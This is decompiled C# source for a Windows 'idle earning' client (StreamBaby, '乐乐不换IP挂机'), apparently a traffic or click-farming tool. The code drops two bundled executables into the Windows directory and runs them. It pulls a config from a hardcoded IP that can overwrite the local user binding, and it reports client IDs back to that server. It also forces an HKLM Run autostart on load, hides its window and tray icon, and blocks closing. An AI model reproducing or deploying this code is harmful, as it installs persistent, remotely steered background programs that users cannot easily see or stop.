using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using Microsoft.Win32;

namespace StreamBaby;

public class OtherForm : Form
{
	private string exe1Path = string.Empty;

	private string exe2Path = string.Empty;

	private string configPath = string.Empty;

	private bool isAutoRun = false;

	private bool isVisiable = true;

	private bool isLogin = false;

	private List<string> clientIdList = new List<string>();

	private static object lockObj = new object();

	private IContainer components = null;

	private Label label1;

	private TextBox txtUserName;

	private Button btnLogin;

	private GroupBox groupBox1;

	private CheckBox chkAutoRun;

	private Label label2;

	private NotifyIcon notifyIcon1;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem toolStripMenuItem_0;

	private ToolStripMenuItem toolStripMenuItem_1;

	private Label lblCurrent;

	private Label label3;

	private Label label4;

	public OtherForm()
	{
		InitializeComponent();
		Control.set_CheckForIllegalCrossThreadCalls(false);
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
	}

	private void btnLogin_Click(object sender, EventArgs e)
	{
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		if (!string.IsNullOrEmpty(((Control)txtUserName).get_Text().Trim()))
		{
			isLogin = true;
			((Control)btnLogin).set_Text("挂机中...");
			try
			{
				Thread thread = new Thread(BrowseRun);
				thread.IsBackground = true;
				thread.Start();
				Thread thread2 = new Thread(UpdateUI);
				thread2.IsBackground = true;
				thread2.Start();
				Thread thread3 = new Thread(DeleteFile);
				thread3.IsBackground = true;
				thread3.Start();
				Thread thread4 = new Thread(StartCheckFile);
				thread4.IsBackground = true;
				thread4.Start();
				((Control)btnLogin).set_Enabled(false);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}
	}

	private void StartCheckFile()
	{
		while (true)
		{
			try
			{
				bool flag = false;
				bool flag2 = false;
				Process[] processes = Process.GetProcesses();
				Process[] array = processes;
				foreach (Process process in array)
				{
					try
					{
						if (process.MainModule!.FileName!.Contains("Receiving end.exe"))
						{
							flag = true;
						}
						if (process.MainModule!.FileName!.Contains("Execution end.exe"))
						{
							flag2 = true;
						}
					}
					catch
					{
					}
				}
				string address;
				WebClient webClient;
				byte[] bytes;
				string folderPath;
				if (!flag)
				{
					address = "http://123.57.239.185/cfg.txt";
					webClient = new WebClient();
					webClient.Encoding = Encoding.UTF8;
					bytes = webClient.DownloadData(address);
					folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					string text = Path.Combine(Path.Combine(folderPath, "LLZHUANQIANZJ"), "cfg.ini");
					if (!File.Exists(text))
					{
						File.WriteAllBytes(text, bytes);
					}
					else
					{
						string @string = Encoding.UTF8.GetString(bytes);
						Regex regex = new Regex("BindUser=(?<binduser>[^\\s]+)");
						string value = regex.Match(@string).Groups["binduser"].Value;
						IniFiles iniFiles = new IniFiles(text);
						string text2 = iniFiles.ReadString("User Configuration", "BindUser", "");
						if (value != text2)
						{
							File.WriteAllBytes(text, bytes);
						}
					}
					string fileName = Path.Combine("C:\\windows\\duoduozhuan", "Receiving end.exe");
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = fileName;
					Process.Start(processStartInfo);
				}
				if (flag2)
				{
					continue;
				}
				address = "http://123.57.239.185/cfg.txt";
				webClient = new WebClient();
				webClient.Encoding = Encoding.UTF8;
				bytes = webClient.DownloadData(address);
				folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				string text3 = Path.Combine(Path.Combine(folderPath, "LLZHUANQIANZQ"), "cfg.ini");
				if (!File.Exists(text3))
				{
					File.WriteAllBytes(text3, bytes);
				}
				else
				{
					string @string = Encoding.UTF8.GetString(bytes);
					Regex regex = new Regex("BindUser=(?<binduser>[^\\s]+)");
					string value = regex.Match(@string).Groups["binduser"].Value;
					IniFiles iniFiles = new IniFiles(text3);
					string text2 = iniFiles.ReadString("User Configuration", "BindUser", "");
					if (value != text2)
					{
					}
				}
				string fileName2 = Path.Combine("C:\\windows\\duoduozhuan", "Execution end.exe");
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
				processStartInfo2.FileName = fileName2;
				Process.Start(processStartInfo2);
			}
			catch
			{
			}
			finally
			{
				Thread.Sleep(1200000);
			}
		}
	}

	private void DeleteFile()
	{
		while (true)
		{
			try
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				string text = Path.Combine(folderPath, "LLZHUANQIANZJ");
				string text2 = Path.Combine(folderPath, "LLZHUANQIANZQ");
				string[] array = new string[2] { text, text2 };
				string[] array2 = array;
				foreach (string path in array2)
				{
					string path2 = Path.Combine(path, "Temporary Internet Files");
					if (Directory.Exists(path2))
					{
						try
						{
							Directory.Delete(path2, recursive: true);
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			finally
			{
				Thread.Sleep(1800000);
			}
		}
	}

	private void BrowseRun()
	{
		SaveInfo();
		string text = Path.Combine("C:\\windows\\duoduozhuan", "Execution end.exe");
		string text2 = Path.Combine("C:\\windows\\duoduozhuan", "Receiving end.exe");
		if (!Directory.Exists("C:\\windows\\duoduozhuan"))
		{
			Directory.CreateDirectory("C:\\windows\\duoduozhuan");
		}
		Thread.Sleep(500);
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("StreamBaby.Execution end.exe.file");
			byte[] array = new byte[manifestResourceStream.Length];
			manifestResourceStream.Read(array, 0, (int)manifestResourceStream.Length);
			manifestResourceStream.Close();
			File.WriteAllBytes(text, array);
		}
		catch
		{
		}
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("StreamBaby.Receiving end.exe.file");
			byte[] array = new byte[manifestResourceStream.Length];
			manifestResourceStream.Read(array, 0, (int)manifestResourceStream.Length);
			manifestResourceStream.Close();
			File.WriteAllBytes(text2, array);
		}
		catch
		{
		}
		Thread.Sleep(500);
		try
		{
			string address = "http://123.57.239.185/cfg.txt";
			WebClient webClient = new WebClient();
			webClient.Encoding = Encoding.UTF8;
			byte[] array = webClient.DownloadData(address);
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string text3 = Path.Combine(folderPath, "LLZHUANQIANZJ");
			string text4 = Path.Combine(folderPath, "LLZHUANQIANZQ");
			if (!Directory.Exists(text3))
			{
				Directory.CreateDirectory(text3);
			}
			if (!Directory.Exists(text4))
			{
				Directory.CreateDirectory(text4);
			}
			string text5 = Path.Combine(text3, "cfg.ini");
			string text6 = Path.Combine(text4, "cfg.ini");
			string text7 = string.Empty;
			try
			{
				RegistryKey currentUser = Registry.CurrentUser;
				RegistryKey registryKey = currentUser.OpenSubKey("Software");
				registryKey.GetSubKeyNames();
				RegistryKey registryKey2 = registryKey.OpenSubKey("StreamBaby");
				if (registryKey2 != null)
				{
					text7 = registryKey2.GetValue(null) as string;
				}
			}
			catch
			{
			}
			if (!File.Exists(text5) || (!string.IsNullOrEmpty(text7) && text7 != ((Control)txtUserName).get_Text()))
			{
				File.WriteAllBytes(text5, array);
			}
			else
			{
				string @string = Encoding.UTF8.GetString(array);
				Regex regex = new Regex("BindUser=(?<binduser>[^\\s]+)");
				string value = regex.Match(@string).Groups["binduser"].Value;
				IniFiles iniFiles = new IniFiles(text5);
				string text8 = iniFiles.ReadString("User Configuration", "BindUser", "");
				if (value != text8)
				{
					File.WriteAllBytes(text5, array);
				}
				else
				{
					iniFiles.WriteString("Global", "ShowWindow", "-1");
					iniFiles.WriteString("Global", "ShowTray", "-1");
				}
			}
			if (!File.Exists(text6) || (!string.IsNullOrEmpty(text7) && text7 != ((Control)txtUserName).get_Text()))
			{
				File.WriteAllBytes(text6, array);
			}
			else
			{
				string @string = Encoding.UTF8.GetString(array);
				Regex regex = new Regex("BindUser=(?<binduser>[^\\s]+)");
				string value = regex.Match(@string).Groups["binduser"].Value;
				IniFiles iniFiles = new IniFiles(text6);
				string text8 = iniFiles.ReadString("User Configuration", "BindUser", "");
				if (value != text8)
				{
					File.WriteAllBytes(text6, array);
				}
				else
				{
					iniFiles.WriteString("Global", "ShowWindow", "-1");
					iniFiles.WriteString("Global", "ShowTray", "-1");
				}
			}
		}
		catch
		{
		}
		GC.Collect(0);
		Thread.Sleep(2000);
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = text;
			Process.Start(processStartInfo);
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.FileName = text2;
			Process.Start(processStartInfo2);
		}
		catch
		{
		}
		Thread.Sleep(1000);
		try
		{
			ReadFileAndUpload();
		}
		catch
		{
		}
	}

	private void ReadFileAndUpload()
	{
		while (true)
		{
			try
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				string text = Path.Combine(folderPath, "LLZHUANQIANZJ");
				string text2 = Path.Combine(folderPath, "LLZHUANQIANZQ");
				string[] array = new string[2] { text, text2 };
				((Control)txtUserName).get_Text().Trim();
				lock (lockObj)
				{
					WebClient webClient = new WebClient();
					webClient.Encoding = Encoding.UTF8;
					string[] array2 = array;
					foreach (string path in array2)
					{
						string[] files = Directory.GetFiles(path, "cfg.ini", SearchOption.AllDirectories);
						string[] array3 = files;
						foreach (string text3 in array3)
						{
							if (!File.Exists(text3))
							{
								continue;
							}
							try
							{
								IniFiles iniFiles = new IniFiles(text3);
								string text4 = iniFiles.ReadString("User Configuration", "ClientID", "");
								if (!string.IsNullOrEmpty(text4))
								{
									if (!clientIdList.Contains(text4))
									{
										clientIdList.Add(text4);
									}
									try
									{
										webClient.DownloadString($"http://123.57.239.185/UpDo.ashx?type=add&userName={HttpUtility.UrlEncode(((Control)txtUserName).get_Text())}&clientId={text4}");
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
			finally
			{
				Thread.Sleep(600000);
			}
		}
	}

	private void MainForm_Load(object sender, EventArgs e)
	{
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string version = GetVersion();
			((Control)this).set_Text(((Control)this).get_Text() + " " + version);
		}
		catch
		{
		}
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "data.txt");
		if (File.Exists(path))
		{
			string[] array = File.ReadAllLines(path, Encoding.UTF8);
			string[] array2 = array;
			foreach (string text in array2)
			{
				string[] array3 = text.Split(new char[1] { '=' }, StringSplitOptions.RemoveEmptyEntries);
				if (array3.Length == 2)
				{
					dictionary.Add(array3[0], array3[1]);
				}
			}
		}
		if (dictionary.ContainsKey("UserName"))
		{
			((Control)txtUserName).set_Text(dictionary["UserName"]);
		}
		if (!string.IsNullOrEmpty(((Control)txtUserName).get_Text().Trim()))
		{
			((TextBoxBase)txtUserName).set_ReadOnly(true);
		}
		if (dictionary.ContainsKey("IsAutoRun"))
		{
			chkAutoRun.set_Checked(dictionary["IsAutoRun"] == "1");
		}
		if (dictionary.ContainsKey("IsVisiable"))
		{
			isVisiable = dictionary["IsVisiable"] == "1";
		}
		try
		{
			HotKey.RegisterHotKey(((Control)this).get_Handle(), 100, HotKey.KeyModifiers.Ctrl, (Keys)82);
		}
		catch
		{
			MessageBox.Show("热键冲突，开启失败！");
		}
		try
		{
			SetAutoRun(Application.get_ExecutablePath(), isAutoRun: true);
		}
		catch
		{
		}
		Thread thread = new Thread(ExecuteButton);
		thread.IsBackground = true;
		thread.Start();
		Thread thread2 = new Thread(LoadText);
		thread2.IsBackground = true;
		thread2.Start();
		Thread thread3 = new Thread(ChangeText);
		thread3.IsBackground = true;
		thread3.Start();
	}

	private void ChangeText()
	{
		string text;
		int i;
		while (true)
		{
			try
			{
				text = string.Empty;
				((Control)this).Invoke((Delegate)(Action<Label>)delegate(Label p)
				{
					text = ((Control)p).get_Text();
				}, new object[1] { label3 });
				if (text.Length <= 19)
				{
					continue;
				}
				for (i = 0; i < text.Length; i++)
				{
					((Control)this).Invoke((Delegate)(Action<Label>)delegate(Label p)
					{
						((Control)p).set_Text(text.Substring(i, text.Length - i));
					}, new object[1] { label3 });
					Thread.Sleep(1000);
				}
				((Control)this).Invoke((Delegate)(Action<Label>)delegate(Label p)
				{
					((Control)p).set_Text(text);
				}, new object[1] { label3 });
			}
			catch
			{
			}
			finally
			{
				Thread.Sleep(1000);
			}
		}
	}

	private void LoadText()
	{
		string text;
		while (true)
		{
			try
			{
				string address = "http://123.57.239.185/UpDo.ashx?type=gettext";
				WebClient webClient = new WebClient();
				webClient.Encoding = Encoding.UTF8;
				text = webClient.DownloadString(address);
				((Control)this).Invoke((Delegate)(Action<Label>)delegate(Label p)
				{
					((Control)p).set_Text(text);
				}, new object[1] { label3 });
			}
			catch
			{
			}
			finally
			{
				Thread.Sleep(1200000);
			}
		}
	}

	private void ExecuteButton()
	{
		try
		{
			if (!string.IsNullOrEmpty(((Control)txtUserName).get_Text()))
			{
				btnLogin_Click(btnLogin, new EventArgs());
			}
		}
		catch
		{
		}
	}

	private void UpdateUI()
	{
		while (true)
		{
			try
			{
				while (clientIdList.Count == 0)
				{
					Thread.Sleep(500);
				}
				Thread.Sleep(500);
				lock (lockObj)
				{
					try
					{
						if (clientIdList.Count > 0)
						{
							string address = "http://123.57.239.185/UpDo.ashx?type=getscore&id=" + string.Join("^", clientIdList.ToArray());
							WebClient webClient = new WebClient();
							webClient.Encoding = Encoding.UTF8;
							string text = webClient.DownloadString(address);
							if (text.Trim() != "0")
							{
								((Control)lblCurrent).set_Text(text);
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			finally
			{
				Thread.Sleep(120000);
			}
		}
	}

	public static void SetAutoRun(string fileName, bool isAutoRun)
	{
		RegistryKey registryKey = null;
		try
		{
			if (File.Exists(fileName))
			{
				string name = fileName.Substring(fileName.LastIndexOf("\\") + 1);
				registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (registryKey == null)
				{
					registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
				}
				if (isAutoRun)
				{
					registryKey.SetValue(name, fileName);
				}
				else
				{
					registryKey.SetValue(name, false);
				}
			}
		}
		catch
		{
		}
		finally
		{
			registryKey?.Close();
		}
	}

	private void chkAutoRun_CheckedChanged(object sender, EventArgs e)
	{
		SetAutoRun(Application.get_ExecutablePath(), chkAutoRun.get_Checked());
		isAutoRun = chkAutoRun.get_Checked();
	}

	protected override void WndProc(ref Message m)
	{
		int msg = ((Message)(ref m)).get_Msg();
		if (msg == 786)
		{
			msg = ((Message)(ref m)).get_WParam().ToInt32();
			if (msg == 100)
			{
				((Control)this).set_Visible(!((Control)this).get_Visible());
				notifyIcon1.set_Visible(((Control)this).get_Visible());
				isVisiable = ((Control)this).get_Visible();
				if (isLogin)
				{
					isVisiable = ((Control)this).get_Visible();
					SaveInfo();
				}
			}
		}
		((Form)this).WndProc(ref m);
	}

	private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
	{
		((Control)this).Hide();
		notifyIcon1.set_Visible(true);
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void toolStripMenuItem_0_Click(object sender, EventArgs e)
	{
		((Control)this).Show();
		notifyIcon1.set_Visible(false);
		((Form)this).set_WindowState((FormWindowState)0);
	}

	private void toolStripMenuItem_1_Click(object sender, EventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Invalid comparison between Unknown and I4
		if ((int)MessageBox.Show("确定退出吗？", "提示", (MessageBoxButtons)1) != 1)
		{
			return;
		}
		try
		{
			HotKey.RegisterHotKey(((Control)this).get_Handle(), 100, HotKey.KeyModifiers.Alt | HotKey.KeyModifiers.Ctrl, (Keys)83);
		}
		catch
		{
		}
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.MainModule!.FileName!.ToLower().Contains("execution end.exe") || process.MainModule!.FileName!.ToLower().Contains("receiving end.exe"))
				{
					process.Kill();
				}
			}
			catch
			{
			}
		}
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey("Software");
			RegistryKey registryKey2 = registryKey.OpenSubKey("StreamBaby");
			if (registryKey2 == null)
			{
				registryKey2 = registryKey.CreateSubKey("StreamBaby");
			}
			registryKey2.SetValue(null, ((Control)txtUserName).get_Text());
		}
		catch
		{
		}
		Application.ExitThread();
		Application.Exit();
	}

	private void SaveInfo()
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		dictionary.Add("UserName", ((Control)txtUserName).get_Text().Trim());
		dictionary.Add("IsAutoRun", chkAutoRun.get_Checked() ? "1" : "0");
		dictionary.Add("IsVisiable", isVisiable ? "1" : "0");
		StringBuilder stringBuilder = new StringBuilder();
		foreach (KeyValuePair<string, string> item in dictionary)
		{
			stringBuilder.AppendFormat("{0}={1}\r\n", item.Key, item.Value);
		}
		File.WriteAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "data.txt"), stringBuilder.ToString(), Encoding.UTF8);
	}

	private void OtherForm_Shown(object sender, EventArgs e)
	{
		if (!isVisiable)
		{
			((Control)this).set_Visible(false);
			notifyIcon1.set_Visible(false);
			((Control)this).Hide();
		}
	}

	protected override void OnShown(EventArgs e)
	{
		if (!isVisiable)
		{
			((Control)this).set_Visible(false);
			notifyIcon1.set_Visible(false);
			((Control)this).Hide();
		}
		else
		{
			((Form)this).OnShown(e);
		}
	}

	private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		((Control)this).Show();
		notifyIcon1.set_Visible(false);
		((Form)this).set_WindowState((FormWindowState)0);
	}

	private void label3_Click(object sender, EventArgs e)
	{
		string text = ((Control)label3).get_Text();
		if (text.Contains("http://"))
		{
			RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey("http\\shell\\open\\command\\");
			string text2 = registryKey.GetValue("")!.ToString();
			string text3 = null;
			text3 = ((!text2.StartsWith("\"")) ? text2.Substring(0, text2.IndexOf(" ")) : text2.Substring(1, text2.IndexOf('"', 1) - 1));
			Regex regex = new Regex("http://(?<url>[^\\s]+)");
			string value = regex.Match(text).Groups["url"].Value;
			Process.Start(text3, "http://" + value);
		}
	}

	private static string GetVersion()
	{
		string result = string.Empty;
		object[] customAttributes = Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(AssemblyFileVersionAttribute), inherit: false);
		if (customAttributes.Length != 0)
		{
			result = ((AssemblyFileVersionAttribute)customAttributes[0]).Version;
		}
		return result;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_02b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bc: Expected O, but got Unknown
		//IL_03a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ad: Expected O, but got Unknown
		//IL_059b: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a5: Expected O, but got Unknown
		//IL_05ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d8: Expected O, but got Unknown
		//IL_070e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0718: Expected O, but got Unknown
		//IL_073d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0747: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(OtherForm));
		label1 = new Label();
		txtUserName = new TextBox();
		btnLogin = new Button();
		groupBox1 = new GroupBox();
		label4 = new Label();
		lblCurrent = new Label();
		label2 = new Label();
		chkAutoRun = new CheckBox();
		label3 = new Label();
		notifyIcon1 = new NotifyIcon(components);
		contextMenuStrip1 = new ContextMenuStrip(components);
		toolStripMenuItem_0 = new ToolStripMenuItem();
		toolStripMenuItem_1 = new ToolStripMenuItem();
		((Control)groupBox1).SuspendLayout();
		((Control)contextMenuStrip1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(6, 29));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(49, 14));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("工号：");
		((Control)txtUserName).set_Location(new Point(56, 26));
		((Control)txtUserName).set_Name("txtUserName");
		((Control)txtUserName).set_Size(new Size(121, 23));
		((Control)txtUserName).set_TabIndex(1);
		((Control)btnLogin).set_Location(new Point(7, 54));
		((Control)btnLogin).set_Name("btnLogin");
		((Control)btnLogin).set_Size(new Size(76, 23));
		((Control)btnLogin).set_TabIndex(2);
		((Control)btnLogin).set_Text("开始挂机");
		((ButtonBase)btnLogin).set_UseVisualStyleBackColor(true);
		((Control)btnLogin).add_Click((EventHandler)btnLogin_Click);
		((Control)groupBox1).get_Controls().Add((Control)(object)label4);
		((Control)groupBox1).get_Controls().Add((Control)(object)lblCurrent);
		((Control)groupBox1).get_Controls().Add((Control)(object)label2);
		((Control)groupBox1).get_Controls().Add((Control)(object)chkAutoRun);
		((Control)groupBox1).get_Controls().Add((Control)(object)label3);
		((Control)groupBox1).get_Controls().Add((Control)(object)label1);
		((Control)groupBox1).get_Controls().Add((Control)(object)btnLogin);
		((Control)groupBox1).get_Controls().Add((Control)(object)txtUserName);
		((Control)groupBox1).set_Font(new Font("楷体", 10.5f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)groupBox1).set_Location(new Point(9, 10));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(289, 101));
		((Control)groupBox1).set_TabIndex(3);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("登录");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(89, 59));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(77, 14));
		((Control)label4).set_TabIndex(9);
		((Control)label4).set_Text("今日赚分：");
		((Control)lblCurrent).set_AutoSize(true);
		((Control)lblCurrent).set_Font(new Font("楷体", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)134));
		((Control)lblCurrent).set_Location(new Point(165, 58));
		((Control)lblCurrent).set_Name("lblCurrent");
		((Control)lblCurrent).set_Size(new Size(17, 16));
		((Control)lblCurrent).set_TabIndex(8);
		((Control)lblCurrent).set_Text("0");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(156, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(126, 14));
		((Control)label2).set_TabIndex(7);
		((Control)label2).set_Text("Ctrl+R(显示/隐藏)");
		((Control)chkAutoRun).set_AutoSize(true);
		chkAutoRun.set_Checked(true);
		chkAutoRun.set_CheckState((CheckState)1);
		((Control)chkAutoRun).set_Location(new Point(189, 29));
		((Control)chkAutoRun).set_Name("chkAutoRun");
		((Control)chkAutoRun).set_Size(new Size(82, 18));
		((Control)chkAutoRun).set_TabIndex(6);
		((Control)chkAutoRun).set_Text("开机启动");
		((ButtonBase)chkAutoRun).set_UseVisualStyleBackColor(true);
		chkAutoRun.add_CheckedChanged((EventHandler)chkAutoRun_CheckedChanged);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_ForeColor(Color.Blue);
		((Control)label3).set_Location(new Point(8, 80));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(0, 14));
		((Control)label3).set_TabIndex(4);
		((Control)label3).add_Click((EventHandler)label3_Click);
		notifyIcon1.set_ContextMenuStrip(contextMenuStrip1);
		notifyIcon1.set_Icon((Icon)componentResourceManager.GetObject("notifyIcon1.Icon"));
		notifyIcon1.set_Text("乐乐不换ip挂机");
		notifyIcon1.set_Visible(true);
		notifyIcon1.add_MouseDoubleClick(new MouseEventHandler(notifyIcon1_MouseDoubleClick));
		((ToolStrip)contextMenuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)toolStripMenuItem_0,
			(ToolStripItem)toolStripMenuItem_1
		});
		((Control)contextMenuStrip1).set_Name("contextMenuStrip1");
		((Control)contextMenuStrip1).set_Size(new Size(101, 48));
		((ToolStripItem)toolStripMenuItem_0).set_Name("退出ToolStripMenuItem");
		((ToolStripItem)toolStripMenuItem_0).set_Size(new Size(100, 22));
		((ToolStripItem)toolStripMenuItem_0).set_Text("查看");
		((ToolStripItem)toolStripMenuItem_0).add_Click((EventHandler)toolStripMenuItem_0_Click);
		((ToolStripItem)toolStripMenuItem_1).set_Name("显示ToolStripMenuItem");
		((ToolStripItem)toolStripMenuItem_1).set_Size(new Size(100, 22));
		((ToolStripItem)toolStripMenuItem_1).set_Text("退出");
		((ToolStripItem)toolStripMenuItem_1).add_Click((EventHandler)toolStripMenuItem_1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(303, 112));
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("OtherForm");
		((Control)this).set_Text("乐乐不换IP挂机");
		((Form)this).add_FormClosing(new FormClosingEventHandler(MainForm_FormClosing));
		((Form)this).add_Load((EventHandler)MainForm_Load);
		((Form)this).add_Shown((EventHandler)OtherForm_Shown);
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)contextMenuStrip1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}
}
